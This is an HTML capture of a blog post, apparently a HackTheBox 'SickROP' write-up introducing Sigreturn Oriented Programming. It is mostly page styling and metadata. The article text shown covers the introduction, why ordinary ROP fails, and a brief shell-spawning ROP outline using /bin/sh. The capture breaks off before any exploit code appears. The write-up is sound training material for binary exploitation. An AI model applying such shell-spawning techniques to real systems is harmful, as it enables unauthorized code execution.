{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F1200\u002F1*sy8HBkyGs-6MKI_GIckiCA.png"],"url":"https:\u002F\u002Fcorruptedprotocol.medium.com\u002Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441","dateCreated":"2021-10-14T15:15:21.742Z","datePublished":"2021-10-14T15:15:21.742Z","dateModified":"2021-10-14T15:15:21.954Z","headline":"SickROP — Hackthebox (Introduction to Sigreturn Oriented Programming\u002FSROP)","name":"SickROP — Hackthebox (Introduction to Sigreturn Oriented Programming\u002FSROP)","description":"Hello PWN enthusiasts, we will do a technique called Sigreturn oriented programming\u002FSROP to complete this challenge. I’ll explain everything in SROP while doing the Sickrop challenge. Skip to the…","identifier":"8b27727cd441","author":{"@type":"Person","name":"Hariharan@Blog:~$","url":"https:\u002F\u002Fcorruptedprotocol.medium.com"},"creator":["Hariharan@Blog:~$"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fcorruptedprotocol.medium.com\u002F","logo":{"@type":"ImageObject","width":308,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F616\u002F1*OMF3fSqH8t4xBJ9-6oZDZw.png"}},"mainEntityOfPage":"https:\u002F\u002Fcorruptedprotocol.medium.com\u002Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441"}</script><link rel="preload" href="https://cdn.optimizely.com/js/16180790160.js" as="script"><style type="text/css" data-fela-rehydration="443" data-fela-type="STATIC">html{box-sizing:border-box}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="KEYFRAME">@-webkit-keyframes k1{from{filter:hue-rotate(0deg)}to{filter:hue-rotate(360deg)}}@-moz-keyframes k1{from{filter:hue-rotate(0deg)}to{filter:hue-rotate(360deg)}}@keyframes k1{from{filter:hue-rotate(0deg)}to{filter:hue-rotate(360deg)}}@-webkit-keyframes k2{0%{opacity:0;transform:translateY(-60px)}100%{opacity:1;transform:translateY(0px)}}@-moz-keyframes k2{0%{opacity:0;transform:translateY(-60px)}100%{opacity:1;transform:translateY(0px)}}@keyframes k2{0%{opacity:0;transform:translateY(-60px)}100%{opacity:1;transform:translateY(0px)}}@-webkit-keyframes k3{0%{opacity:1;transform:translateY(0px)}100%{opacity:0;transform:translateY(-60px)}}@-moz-keyframes k3{0%{opacity:1;transform:translateY(0px)}100%{opacity:0;transform:translateY(-60px)}}@keyframes k3{0%{opacity:1;transform:translateY(0px)}100%{opacity:0;transform:translateY(-60px)}}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{height:100vh}.m{width:100vw}.n{display:flex}.o{align-items:center}.p{justify-content:center}.q{height:25px}.r{fill:rgba(41, 41, 41, 1)}.s{display:block}.t{margin-bottom:36px}.v{padding-top:8px}.w{width:100%}.ab{flex:0 0 auto}.ac{justify-self:flex-end}.ae{z-index:500}.af{visibility:hidden}.ag{min-height:115px}.aj{flex-direction:column}.ak{background-color:#171515}.al{display:none}.an{white-space:nowrap}.ao{border-bottom:none}.ap{position:relative}.av{max-width:1192px}.aw{min-width:0}.ax{height:62px}.ay{flex-direction:row}.az{flex:1 0 auto}.ba{margin-right:16px}.bb{font-family:fell, Georgia, Cambria, "Times New Roman", Times, serif}.bc{font-size:14px}.bd{line-height:20px}.be{color:rgba(232, 229, 228, 1)}.bf{padding:7px 16px 9px}.bg{background:0}.bh{fill:rgba(232, 229, 228, 1)}.bi{border-color:rgba(213, 209, 209, 1)}.bn:disabled{cursor:inherit}.bo:disabled{opacity:0.3}.bp:disabled:hover{color:rgba(232, 229, 228, 1)}.bq:disabled:hover{fill:rgba(232, 229, 228, 1)}.br:disabled:hover{border-color:rgba(213, 209, 209, 1)}.bs{border-radius:99em}.bt{border-width:1px}.bu{border-style:solid}.bv{box-sizing:border-box}.bw{display:inline-block}.bx{text-decoration:none}.by{margin-left:0px}.bz{color:rgba(193, 190, 189, 1)}.ca{font-size:inherit}.cb{border:inherit}.cc{font-family:inherit}.cd{letter-spacing:inherit}.ce{font-weight:inherit}.cf{padding:0}.cg{margin:0}.ch:disabled{cursor:default}.ci:disabled{color:rgba(163, 208, 162, 0.5)}.cj:disabled{fill:rgba(163, 208, 162, 0.5)}.ck{justify-content:space-between}.cq{align-items:flex-start}.cr{margin-bottom:0px}.cs{margin-top:-32px}.ct{align-items:flex-end}.cu{flex-wrap:wrap}.cx{margin-top:32px}.cy{margin-right:24px}.da{font-weight:500}.db{font-size:27px}.dc{line-height:34px}.dd:before{margin-bottom:-14px}.de:before{content:""}.df:before{display:table}.dg:before{border-collapse:collapse}.dh:after{margin-top:-6px}.di:after{content:""}.dj:after{display:table}.dk:after{border-collapse:collapse}.dl{letter-spacing:0}.dm{color:#89dd2fff}.dn{word-break:break-word}.do{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.dp{margin-bottom:-3px}.dq{margin-left:14px}.dr{margin-top:-3px}.ds{fill:rgba(251, 248, 247, 1)}.dt{padding-top:1px}.du{height:70px}.dv{font-size:16px}.dw{line-height:24px}.dx:before{margin-bottom:-10px}.dy{color:rgba(117, 117, 117, 1)}.dz{margin-right:12px}.ea{display:inline-flex}.eb{color:inherit}.ec{fill:inherit}.ef:disabled{color:rgba(117, 117, 117, 1)}.eg:disabled{fill:rgba(117, 117, 117, 1)}.eh{margin-left:12px}.ei{position:absolute}.ej{right:24px}.ek{margin:0px}.el{border:0px}.em{padding:0px}.en{cursor:pointer}.eo{stroke:rgba(117, 117, 117, 1)}.er{left:0}.es{opacity:0}.et{position:fixed}.eu{right:0}.ev{top:0}.ex{height:60px}.fa{height:100%}.fd{color:rgba(66, 156, 0, 1)}.fe{fill:rgba(66, 156, 0, 1)}.ff{border-color:rgba(66, 156, 0, 1)}.fj:disabled:hover{color:rgba(66, 156, 0, 1)}.fk:disabled:hover{fill:rgba(66, 156, 0, 1)}.fl:disabled:hover{border-color:rgba(66, 156, 0, 1)}.fm{margin-left:16px}.fn{padding-left:24px}.fo{padding-right:24px}.fp{margin-left:auto}.fq{margin-right:auto}.fr{max-width:728px}.fs{background:rgba(255, 255, 255, 1)}.ft{border:1px solid rgba(230, 230, 230, 1)}.fu{border-radius:4px}.fv{box-shadow:0 1px 4px rgba(230, 230, 230, 1)}.fw{max-height:100vh}.fx{overflow-y:auto}.fy{top:calc(100vh + 100px)}.fz{bottom:calc(100vh + 100px)}.ga{width:10px}.gb{pointer-events:none}.gc{word-wrap:break-word}.gd:after{display:block}.ge:after{clear:both}.gf{max-width:680px}.gg{line-height:1.23}.gh{font-style:normal}.hc{margin-bottom:-0.27em}.hd{color:rgba(41, 41, 41, 1)}.hh{border-radius:50%}.hi{height:28px}.hj{width:28px}.hk{margin-left:8px}.hl{margin:0 4px}.hm{margin:0 7px}.hv{margin:0 6px 0 7px}.hw{max-width:763px}.hx{margin-top:33px}.hy{clear:both}.ia{cursor:zoom-in}.ib{z-index:auto}.id{max-width:100%}.ie{height:auto}.if{line-height:1.18}.ig{letter-spacing:-0.022em}.jb{margin-bottom:-0.31em}.jc{line-height:1.58}.jd{letter-spacing:-0.004em}.jy{margin-bottom:-0.46em}.kj{padding:20px}.kk{background:rgba(242, 242, 242, 1)}.kl{overflow-x:auto}.km{font-family:Menlo, Monaco, "Courier New", Courier, monospace}.kn{margin-top:-0.09em}.ko{margin-bottom:-0.09em}.kp{white-space:pre-wrap}.kq{max-width:808px}.kr{transition:opacity 100ms 400ms}.ks{overflow:hidden}.kt{will-change:transform}.ku{transform:translateZ(0)}.kv{margin:auto}.kw{background-color:rgba(242, 242, 242, 1)}.kx{padding-bottom:45.285714285714285%}.ky{height:0}.kz{filter:blur(20px)}.la{transform:scale(1.1)}.lb{visibility:visible}.lc{box-shadow:inset 3px 0 0 0 rgba(41, 41, 41, 1)}.ld{padding-left:23px}.le{margin-left:-20px}.lf{font-style:italic}.lg{text-decoration:underline}.lh{max-width:1078px}.li{padding-bottom:3.5714285714285716%}.lj{max-width:1081px}.lk{padding-bottom:6.714285714285714%}.ll{font-weight:600}.lm{max-width:773px}.ln{padding-bottom:24.857142857142858%}.lo{max-width:689px}.lp{padding-bottom:88.24383164005805%}.lq{max-width:910px}.lr{padding-bottom:30.714285714285715%}.ls{max-width:1241px}.lt{padding-bottom:37.85714285714286%}.lu{max-width:571px}.lv{padding-bottom:18.038528896672506%}.lw{max-width:416px}.lx{padding-bottom:32.69230769230769%}.ly{max-width:1080px}.lz{padding-bottom:8.285714285714286%}.mf{max-width:749px}.mg{padding-bottom:15.142857142857142%}.mp{max-width:1918px}.mq{padding-bottom:5px}.mr{padding-top:5px}.ms{max-width:1637px}.mt{max-width:1111px}.mu{padding-bottom:16%}.mv{will-change:opacity}.mw{width:188px}.mx{left:50%}.my{transform:translateX(406px)}.mz{top:calc(65px + 54px + 14px)}.nc{will-change:opacity, transform}.nd{transform:translateY(159px)}.nf{width:197px}.ng{margin-bottom:20px}.nh{padding-top:2px}.ni{padding-top:20px}.nj{color:rgba(255, 255, 255, 1)}.nk{fill:rgba(255, 255, 255, 1)}.nl{background:rgba(66, 156, 0, 1)}.nn:disabled:hover{background:rgba(66, 156, 0, 1)}.no{padding-top:32px}.np{border-top:1px solid rgba(230, 230, 230, 1)}.nq{justify-content:space-evenly}.nr{margin-right:20px}.nx{outline:0}.ny{border:0}.nz{user-select:none}.oa> svg{pointer-events:none}.oc{-webkit-user-select:none}.of{margin-top:2px}.og{fill:rgba(61, 61, 61, 1)}.oh{opacity:1}.oi{margin-top:1px}.oj{margin-top:40px}.ok{padding-bottom:25px}.ol{margin-top:25px}.om{max-width:155px}.os{margin-left:24px}.ot{margin-top:4px}.ou{padding-bottom:40px}.ov{list-style-type:none}.ow{margin-right:8px}.ox{margin-bottom:8px}.oy{font-size:13px}.oz{line-height:22px}.pa{border-radius:3px}.pb{padding:5px 10px}.pc{padding-top:40px}.pd{padding-bottom:4px}.pe{background-color:rgba(250, 250, 250, 1)}.pu{text-overflow:ellipsis}.pv{display:-webkit-box}.pw{-webkit-line-clamp:2}.px{-webkit-box-orient:vertical}.pz{padding-top:25px}.bj:hover{color:rgba(251, 248, 247, 1)}.bk:hover{fill:rgba(251, 248, 247, 1)}.bl:hover{border-color:rgba(251, 248, 247, 1)}.bm:hover{cursor:pointer}.ed:hover{color:rgba(25, 25, 25, 1)}.ee:hover{fill:rgba(25, 25, 25, 1)}.fg:hover{color:rgba(61, 133, 0, 1)}.fh:hover{fill:rgba(61, 133, 0, 1)}.fi:hover{border-color:rgba(61, 133, 0, 1)}.nm:hover{background:rgba(61, 133, 0, 1)}.oe:hover{fill:rgba(117, 117, 117, 1)}.ic:focus{transform:scale(1.01)}.od:focus{fill:rgba(117, 117, 117, 1)}.ob:active{border-style:none}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.x{display:flex}.au{margin:0 64px}.gy{font-size:46px}.gz{margin-top:0.6em}.ha{line-height:56px}.hb{letter-spacing:-0.011em}.ht{margin-left:30px}.ix{font-size:22px}.iy{margin-top:1.72em}.iz{line-height:28px}.ja{letter-spacing:0}.ju{font-size:21px}.jv{margin-top:0.86em}.jw{line-height:32px}.jx{letter-spacing:-0.003em}.kd{margin-top:2em}.ki{margin-top:56px}.me{margin-top:1.91em}.mo{max-width:1192px}.nw{margin-right:5px}.or{display:inline-block}.pr{font-size:20px}.ps{line-height:24px}.pt{max-height:48px}.qb{margin:0}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.hs{margin-left:30px}.nv{margin-right:5px}.oq{display:inline-block}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.hr{margin-left:30px}.nu{margin-right:5px}.op{display:inline-block}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.u{margin-bottom:20px}.ah{box-shadow:inset 0 -1px 0 rgba(230, 230, 230, 1)}.ai{min-height:230px}.am{display:block}.cl{min-height:98px}.cm{display:flex}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:flex-end}.cv{margin-bottom:28px}.cw{margin-top:0px}.cz{margin-top:28px}.ep{border-top:1px solid rgba(230, 230, 230, 1)}.eq{border-bottom:1px solid rgba(230, 230, 230, 1)}.fb{align-items:center}.fc{flex:1 0 auto}.hf{margin-top:32px}.hg{flex-direction:column-reverse}.hp{margin-bottom:30px}.hq{margin-left:0px}.nt{margin-left:8px}.oo{display:inline-block}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.aq{margin:0 24px}.ey{display:block}.gi{font-size:32px}.gj{margin-top:0.64em}.gk{line-height:40px}.gl{letter-spacing:-0.016em}.he{margin-top:32px}.hn{margin-bottom:30px}.ho{margin-left:0px}.ih{font-size:20px}.ii{margin-top:1.23em}.ij{line-height:24px}.ik{letter-spacing:0}.je{font-size:18px}.jf{margin-top:0.67em}.jg{line-height:28px}.jh{letter-spacing:-0.003em}.jz{margin-top:1.56em}.ke{margin-top:40px}.ma{margin-top:1.41em}.mh{margin:0}.mi{max-width:100%}.ns{margin-left:8px}.on{display:inline-block}.pf{font-size:16px}.pg{line-height:20px}.ph{max-height:40px}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.y{display:flex}.at{margin:0 64px}.gu{font-size:46px}.gv{margin-top:0.6em}.gw{line-height:56px}.gx{letter-spacing:-0.011em}.it{font-size:22px}.iu{margin-top:1.72em}.iv{line-height:28px}.iw{letter-spacing:0}.jq{font-size:21px}.jr{margin-top:0.86em}.js{line-height:32px}.jt{letter-spacing:-0.003em}.kc{margin-top:2em}.kh{margin-top:56px}.md{margin-top:1.91em}.mn{max-width:1192px}.po{font-size:20px}.pp{line-height:24px}.pq{max-height:48px}.qa{margin:0}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.z{display:flex}.as{margin:0 48px}.gq{font-size:46px}.gr{margin-top:0.6em}.gs{line-height:56px}.gt{letter-spacing:-0.011em}.ip{font-size:22px}.iq{margin-top:1.72em}.ir{line-height:28px}.is{letter-spacing:0}.jm{font-size:21px}.jn{margin-top:0.86em}.jo{line-height:32px}.jp{letter-spacing:-0.003em}.kb{margin-top:2em}.kg{margin-top:56px}.mc{margin-top:1.91em}.ml{margin:0}.mm{max-width:100%}.pl{font-size:20px}.pm{line-height:24px}.pn{max-height:48px}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.ar{margin:0 24px}.ez{display:block}.gm{font-size:32px}.gn{margin-top:0.64em}.go{line-height:40px}.gp{letter-spacing:-0.016em}.il{font-size:20px}.im{margin-top:1.23em}.in{line-height:24px}.io{letter-spacing:0}.ji{font-size:18px}.jj{margin-top:0.67em}.jk{line-height:28px}.jl{letter-spacing:-0.003em}.ka{margin-top:1.56em}.kf{margin-top:40px}.mb{margin-top:1.41em}.mj{margin:0}.mk{max-width:100%}.pi{font-size:16px}.pj{line-height:20px}.pk{max-height:40px}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="print">.hu{display:none}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.ew{animation:k3 .2s ease-in-out both}.hz{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}.na{transition:opacity 200ms}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (max-width: 1230px)">.nb{display:none}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="all and (max-width: 1240px)">.ne{display:none}</style><style type="text/css" data-fela-rehydration="443" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.py{max-height:none}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="s"><div class="t s u"><div class="ag s ah ai"><div class="n aj ak"><div class="al am"><div class="ao s ap ae"><div class="n p"><div class="aq ar as at au av aw w"><div class="ax n o"><div class="n o ay az"><div class="ba s"><span><button class="bb b bc bd be bf bg bh bi bj bk bl bm bn bo bp bq br bs bt bu bv bw bx">Get started</button></span></div><div class="an"><div class="by al am"><span class="bb b bc bd bz"><a href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F8b27727cd441&amp;~feature=LoOpenInAppButton&amp;~channel=ShowPostUnderUser&amp;~stage=mobileNavBar&amp;source=post_page-----8b27727cd441--------------------------------" class="be bh ca cb cc cd ce cf cg bm bj bk ch ci cj" rel="noopener follow">Open in app</a></span></div></div></div><a href="https://medium.com/?source=post_page-----8b27727cd441--------------------------------" rel="noopener follow" aria-label="Homepage"><svg viewBox="0 0 1043.63 592.71" class="q bh"><g data-name="Layer 2"><g data-name="Layer 1"><path d="M588.67 296.36c0 163.67-131.78 296.35-294.33 296.35S0 460 0 296.36 131.78 0 294.34 0s294.33 132.69 294.33 296.36M911.56 296.36c0 154.06-65.89 279-147.17 279s-147.17-124.94-147.17-279 65.88-279 147.16-279 147.17 124.9 147.17 279M1043.63 296.36c0 138-23.17 249.94-51.76 249.94s-51.75-111.91-51.75-249.94 23.17-249.94 51.75-249.94 51.76 111.9 51.76 249.94"></path></g></g></svg></a></div></div></div></div></div><div class="n p"><div class="aq ar as at au av aw w"><div class="ag n o ay ck cl cm cn co cp"><div class="w n cq ck"><div class="v n w"><div class="cr cs w n ct ay cu cv cw cm cn co"><div class="cx cy s cz"><a rel="noopener follow" aria-label="Author Homepage" href="/?source=post_page-----8b27727cd441--------------------------------"><span class="bb da db dc dd de df dg dh di dj dk dl dm dn">Hariharan@Blog:~$</span></a></div></div></div><div class="x y z k h ab ac o ae af"><p class="do b bc bd bz"><span><a href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fcorruptedprotocol.medium.com%2Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441&amp;source=post_page-----8b27727cd441---------------------nav_reg-----------" class="be bh ca cb cc cd ce cf cg bm bj bk ch ci cj" rel="noopener follow">Sign in</a></span></p><div class="dp dq dr cy s"><span><button class="do b bc bd be bf bg bh bi bj bk bl bm bn bo bp bq br bs bt bu bv bw bx">Get started</button></span></div><a href="https://medium.com/?source=post_page-----8b27727cd441--------------------------------" rel="noopener follow" aria-label="Homepage"><svg viewBox="0 0 1043.63 592.71" class="q ds"><g data-name="Layer 2"><g data-name="Layer 1"><path d="M588.67 296.36c0 163.67-131.78 296.35-294.33 296.35S0 460 0 296.36 131.78 0 294.34 0s294.33 132.69 294.33 296.36M911.56 296.36c0 154.06-65.89 279-147.17 279s-147.17-124.94-147.17-279 65.88-279 147.16-279 147.17 124.9 147.17 279M1043.63 296.36c0 138-23.17 249.94-51.76 249.94s-51.75-111.91-51.75-249.94 23.17-249.94 51.75-249.94 51.76 111.9 51.76 249.94"></path></g></g></svg></a></div></div></div></div></div></div><div class="s"><div class="n p"><div class="aq ar as at au av aw w"><div><div class="dt du n o"><div class="s"><span class="bb b dv dw dx de df dg dh di dj dk dy"><div class="n o"><div class="dz ea aj"><span class="bb b bc bd dy"><a class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" rel="noopener follow" href="/followers?source=post_page-----8b27727cd441--------------------------------">33 Followers</a></span></div><div class="s h"></div><div class="s h"></div><div class="eh n aj h"><a class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" rel="noopener follow" href="/about?source=post_page-----8b27727cd441--------------------------------">About</a></div></div></span></div><div class="al ei ej am"><button class="n o p ek el em en" aria-label="Expand navbar"><svg width="14" height="14" class="eo"><path d="M0 .5h14M0 7h14M0 13.5h14"></path></svg></button></div></div></div></div></div></div></div><div class="ep eq c er es et eu ev af ae ew"><div class="n p"><div class="aq ar as at au av aw w"><div class="ex w ey ez j i d ev ae"><div class="fa n o"><div class="al cm fb fc"><span><button class="bb b bc bd fd bf bg fe ff fg fh fi bm bn bo fj fk fl bs bt bu bv bw bx">Get started</button></span><div class="fm al am"><span class="bb b bc bd dy"><a href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F8b27727cd441&amp;~feature=LoOpenInAppButton&amp;~channel=ShowPostUnderUser&amp;~stage=mobileNavBar&amp;source=post_page-----8b27727cd441--------------------------------" class="fd fe ca cb cc cd ce cf cg bm fg fh ch ci cj" rel="noopener follow">Open in app</a></span></div></div><a href="https://medium.com/?source=post_page-----8b27727cd441--------------------------------" rel="noopener follow" aria-label="Homepage"><svg viewBox="0 0 1043.63 592.71" class="q r"><g data-name="Layer 2"><g data-name="Layer 1"><path d="M588.67 296.36c0 163.67-131.78 296.35-294.33 296.35S0 460 0 296.36 131.78 0 294.34 0s294.33 132.69 294.33 296.36M911.56 296.36c0 154.06-65.89 279-147.17 279s-147.17-124.94-147.17-279 65.88-279 147.16-279 147.17 124.9 147.17 279M1043.63 296.36c0 138-23.17 249.94-51.76 249.94s-51.75-111.91-51.75-249.94 23.17-249.94 51.75-249.94 51.76 111.9 51.76 249.94"></path></g></g></svg></a></div></div></div></div></div></div><article><section class="fn fo fp fq w fr bv s"></section><span class="s"></span><div><div class="ei er fy fz ga gb"></div><section class="dn gc gd di ge"><div class="n p"><div class="aq ar as at au gf aw w"><div class=""><h1 id="5ce7" class="gg dl gh bb b gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd">SickROP — Hackthebox (Introduction to Sigreturn Oriented Programming/SROP)</h1><div class="cx"><div class="n ck he hf hg"><div class="o n"><div><a rel="noopener follow" href="/?source=post_page-----8b27727cd441--------------------------------"><img alt="Hariharan@Blog:~$" class="s hh hi hj" src="https://miro.medium.com/fit/c/56/56/1*XeO4n8OHQj91HU2b0XXmyw.jpeg" width="28" height="28"/></a></div><div class="hk w n cu"><div class="n"><div style="flex:1"><span class="bb b bc bd hd"><a class="" rel="noopener follow" href="/?source=post_page-----8b27727cd441--------------------------------"><p class="bb b bc bd fd">Hariharan@Blog:~$</p></a></span></div></div><span class="bb b bc bd dy"><a class="" rel="noopener follow" href="/sickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441?source=post_page-----8b27727cd441--------------------------------"><p class="bb b bc bd dy"><span class="hl"></span>Just now<span class="hm">·</span>8 min read</p></a></span></div></div><div class="n ct hn ho hp hq hr hs ht hu"><div class="n o"><div class="bw" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bw" role="tooltip" aria-hidden="false"><button class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post"><svg width="25" height="25" class="r"><g fill-rule="evenodd"><path d="M15.6 5a.42.42 0 0 0 .17-.3.42.42 0 0 0-.12-.33l-2.8-2.79a.5.5 0 0 0-.7 0l-2.8 2.8a.4.4 0 0 0-.1.32c0 .12.07.23.16.3h.02a.45.45 0 0 0 .57-.04l2-2V10c0 .28.23.5.5.5s.5-.22.5-.5V2.93l2.02 2.02c.08.07.18.12.3.13.11.01.21-.02.3-.08v.01"></path><path d="M18 7h-1.5a.5.5 0 0 0 0 1h1.6c.5 0 .9.4.9.9v10.2c0 .5-.4.9-.9.9H6.9a.9.9 0 0 1-.9-.9V8.9c0-.5.4-.9.9-.9h1.6a.5.5 0 0 0 .35-.15A.5.5 0 0 0 9 7.5a.5.5 0 0 0-.15-.35A.5.5 0 0 0 8.5 7H7a2 2 0 0 0-2 2v10c0 1.1.9 2 2 2h11a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2"></path></g></svg></button></div></div></div><div class="hv s"></div><div class="s az"></div></div></div></div></div></div><figure class="hx hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq hw"><img alt="" class="w id ie" src="https://miro.medium.com/max/1400/1*sy8HBkyGs-6MKI_GIckiCA.png" width="700" height="318" role="presentation"/></div></div></figure><h2 id="fc72" class="if ig gh bb da ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb hd">INTRODUCTION</h2><p id="1bd6" class="jc jd gh bb b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy dn hd">Hello PWN enthusiasts, we will do a technique called Sigreturn oriented programming/SROP to complete this challenge. I’ll explain everything in SROP while doing the Sickrop challenge. Skip to the challenge section if you know about the basics of SIGRETURN.</p><p id="d01a" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">NOTE: I am using the mprotect() method in this blog. I’ll probably put a blog on the sys_execve() method later :)</p><h2 id="615e" class="if ig gh bb da ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb hd">WHY SIGRETURN?</h2><p id="9749" class="jc jd gh bb b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy dn hd">So why do we learn a new attack? Couldn’t we use normal ROP to finish the challenge?</p><p id="2635" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">64-bit binary has some <span id="rmm"><span id="rmm">c</span></span>alling conventions for every function. The parameters to the function need to be loaded into registers before the function is called. For example, when there is a system call, We load “/bin/sh” or “/bin/bash” as a pointer to the RDI register. Then we call the system call. This will pop us a shell as expected.</p><pre class="ke kf kg kh ki kj kk kl"><span id="41cd" class="hd if ig gh km b dv kn ko s kp">pop rdi;<br/>*pointer to /bin/sh*<br/>system call</span></pre><p id="cb8f" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">This is a basic ROP chain that we usually use when we have pop rdi. But let us see what Sickrop binary has. I am using ROPgadget for listing out all the gadgets this binary has.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq kq"><div class="kv s ap kw"><div class="kx ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*VtUlsnaISQBtkpytnBBgbw.png?q=20" width="700" height="317" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="317" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*VtUlsnaISQBtkpytnBBgbw.png" width="700" height="317" srcSet="https://miro.medium.com/max/552/1*VtUlsnaISQBtkpytnBBgbw.png 276w, https://miro.medium.com/max/1104/1*VtUlsnaISQBtkpytnBBgbw.png 552w, https://miro.medium.com/max/1280/1*VtUlsnaISQBtkpytnBBgbw.png 640w, https://miro.medium.com/max/1400/1*VtUlsnaISQBtkpytnBBgbw.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="0c20" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">We have only 16 gadgets available :( We do not have a pop rdi. So how do we execute system call.</p><p id="d74a" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">We could use syscall to perform an sys_execve(). For this I will be using the Linux syscall table to find what parameters I need to call sys_execve().</p><blockquote class="lc ld le"><p id="38ec" class="jc jd lf bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd"><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" class="eb lg" target="_blank" rel="noopener ugc nofollow">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p></blockquote><p id="ae4c" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">If you find for sys_execve there are a lot of parameters to pass before we call this function. I’ll make your life easier.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq lh"><div class="kv s ap kw"><div class="li ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*IqO_Mw8y7gIqJflrTpwVlw.png?q=20" width="700" height="25" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="25" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*IqO_Mw8y7gIqJflrTpwVlw.png" width="700" height="25" srcSet="https://miro.medium.com/max/552/1*IqO_Mw8y7gIqJflrTpwVlw.png 276w, https://miro.medium.com/max/1104/1*IqO_Mw8y7gIqJflrTpwVlw.png 552w, 